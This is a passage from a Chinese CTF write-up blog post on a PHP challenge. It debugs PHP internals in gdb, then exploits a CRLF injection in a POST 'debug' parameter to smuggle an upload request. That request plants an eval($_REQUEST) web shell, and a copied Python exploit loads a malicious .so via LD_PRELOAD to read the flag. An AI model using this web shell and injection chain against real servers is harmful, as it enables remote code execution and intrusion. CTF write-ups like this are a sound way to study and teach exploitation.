<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_string</span> &#123;</span></span><br><span class="line">        zend_refcounted_h gc;</span><br><span class="line">        zend_ulong        h;</span><br><span class="line">        <span class="keyword">size_t</span>            len;</span><br><span class="line">        <span class="keyword">char</span>              val[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>再来看看<code>ht</code>究竟是什么哈希表，<code>r12</code>值为<code>0x555555c13fa0</code>，也就是<code>core_globals</code>结构体起始地址为<code>0x555555c13fa0</code>，偏移<code>0x170</code>后是<code>0x555555c14110</code></li>
</ul>
<p>参考<a href="https://blog.csdn.net/u011660200/article/details/52150164" target="_blank" rel="noopener">gdb 显示结构体中成员的偏移量</a>中的方法，输出<code>core_globals</code>成员的偏移地址，最终找到<code>http_globals</code>成员的地址为<code>0x555555c14110</code>:</p>
<p><img src="/images/http_globals.JPG" alt=""></p>
<p><code>http_globals</code>定义为<code>zval * http_globals[6];</code>，用于获取http参数，其有7个索引</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRACK_VARS_POST           0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRACK_VARS_GET            1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRACK_VARS_COOKIE         2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRACK_VARS_SERVER         3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRACK_VARS_ENV            4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRACK_VARS_FILES          5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRACK_VARS_REQUEST        6</span></span><br></pre></td></tr></table></figure>

<p>这里正好是<code>0x555555c14110</code>，也就是第一个索引<code>TRACK_VARS_POST</code>，后面的<code>zend_hash_find</code>也就相当于<code>$_POST[&#39;debug&#39;]</code></p>
<h2 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h2><p>接着就是post一个<code>debug</code>参数控制<code>path</code>构造文件上传包，方法是构造这样一个双http包:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">GET /sadfas </span><br><span class="line">HTTP/1.1</span><br><span class="line"><span class="attribute">HOST:localhost</span></span><br><span class="line"><span class="attribute">Connection:Keep-Alive</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh,en-US;q=0.7,en;q=0.3</span><br><span class="line"><span class="attribute">Referer</span>: http://127.0.0.1:8080/index.php?act=upload</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------6693638881479522630623693797</span><br><span class="line"><span class="attribute">Content-Length</span>: 244</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------6693638881479522630623693797</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="logout.php"</span><br><span class="line"><span class="attribute">Content-Type</span>: text/php</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line"><span class="attribute">eval($_REQUEST[a]);</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">-----------------------------6693638881479522630623693797--</span></span><br><span class="line"><span class="attribute">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span>: ComputerVendor</span><br><span class="line"><span class="attribute">Cookie</span>: nilnilnilnil</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Identity</span>: unknown</span><br></pre></td></tr></table></figure>

<p>因为第二个http包中有<code>Connection: close</code>，所以后面的</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span>: ComputerVendor</span><br><span class="line"><span class="attribute">Cookie</span>: nilnilnilnil</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Identity</span>: unknown</span><br></pre></td></tr></table></figure>
<p>会被丢弃掉</p>
<p>懒得自己写了，copy一下官方exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'xxxxxx'</span></span><br><span class="line">timeout=<span class="number">5</span></span><br><span class="line">data = <span class="string">'504f5354202f75706c6f61642e70687020485454502f312e310d0a486f73743a203132372e302e302e313a383038300d0a557365722d4167656e743a204d6f7a696c6c612f352e3020284d6163696e746f73683b20496e74656c204d6163204f5320582031302e31333b2072763a36362e3029204765636b6f2f32303130303130312046697265666f782f36362e300d0a4163636570743a20746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c2a2f2a3b713d302e380d0a4163636570742d4c616e67756167653a207a682c656e2d55533b713d302e372c656e3b713d302e330d0a526566657265723a20687474703a2f2f3132372e302e302e313a383038302f696e6465782e7068703f6163743d75706c6f61640d0a436f6e74656e742d547970653a206d756c7469706172742f666f726d2d646174613b20626f756e646172793d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739370d0a436f6e74656e742d4c656e6774683a203234340d0a436f6e6e656374696f6e3a20636c6f73650d0a557067726164652d496e7365637572652d52657175657374733a20310d0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739370d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d226c6f676f75742e706870220d0a436f6e74656e742d547970653a20746578742f7068700d0a0d0a3c3f706870200d0a6576616c28245f524551554553545b615d293b0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739372d2d0d0a'</span>.replace(</span><br><span class="line">    <span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">data = data.decode(<span class="string">'hex'</span>)</span><br><span class="line">requests.post(url+<span class="string">'/index.php'</span>,</span><br><span class="line">              data=&#123;<span class="string">'debug'</span>: <span class="string">"sadfas HTTP/1.1\r\nHOST:localhost\r\nConnection:Keep-Alive\r\n\r\n%s\r\n"</span> % data&#125;, timeout=timeout)</span><br><span class="line"></span><br><span class="line">requests.post(url+<span class="string">'/index.php'</span>,</span><br><span class="line">              data=&#123;<span class="string">'debug'</span>: <span class="string">"sadfas HTTP/1.1\r\nHOST:localhost\r\nConnection:Keep-Alive\r\n\r\n%s\r\n"</span> % data&#125;, timeout=timeout)</span><br><span class="line"></span><br><span class="line">requests.post(url+<span class="string">'/post.php?md=logout.md'</span>, data=&#123;</span><br><span class="line">    <span class="string">'a'</span>: <span class="string">'move_uploaded_file($_FILES["aaa"]["tmp_name"],"/tmp/test.so");'</span></span><br><span class="line">&#125;,</span><br><span class="line">    files=&#123;<span class="string">"aaa"</span>: (<span class="string">"filename1"</span>, open(<span class="string">"test.so"</span>, <span class="string">"rb"</span>))&#125;,</span><br><span class="line">    timeout=timeout)</span><br><span class="line">requests.post(url+<span class="string">'/post.php?md=logout.md'</span>,</span><br><span class="line">              data=&#123;<span class="string">'a'</span>: <span class="string">'putenv("LD_PRELOAD=/tmp/test.so");pmark_read("posts/logout.md");'</span>&#125;, timeout=timeout)</span><br><span class="line">data = requests.post(url+<span class="string">'/post.php?md=logout.md'</span>, data=&#123;</span><br><span class="line">    <span class="string">'a'</span>: <span class="string">'print_r(file_get_contents("/tmp/flag"));'</span></span><br><span class="line">&#125;).content</span><br><span class="line">info = re.search(<span class="string">r'flag\&#123;.*\&#125;'</span>, data)</span><br><span class="line">print(info.group(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>

  </div>
  <div class="post-meta">
    <span class="post-time" style="color:#646060;font-size:13px">2020-08-17</span>
  </div>

  <div class="post-footer">
    
      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
    

    <a href="#top" class="top">Back to Top</a>
  </div>
</article>

<!-- 评论插件 -->

<footer>
  2025
  <span class="author">
    LionTree
  </span>
</footer>


    </div>
  </body>
</html>